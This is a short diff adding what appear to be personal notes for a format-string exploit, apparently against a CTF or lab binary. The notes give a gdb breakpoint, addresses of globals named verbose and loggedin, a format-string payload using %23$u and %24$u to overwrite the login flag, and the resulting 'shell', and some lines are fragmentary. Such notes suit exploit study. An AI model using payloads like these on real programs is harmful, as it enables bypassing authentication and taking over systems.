@@ -1,0 +1,17 @@
+b *0x080488a1
+
+0x98cd038 = globals.verbose
+0x98cd044 = globals.loggedin
+
+
+1%uadres
+
+payload at $24
+
+
+
+AA 00d9cd98 %23$u1%24$u
+shell
+
+cd98 = 52632
+00d9 = 331>&
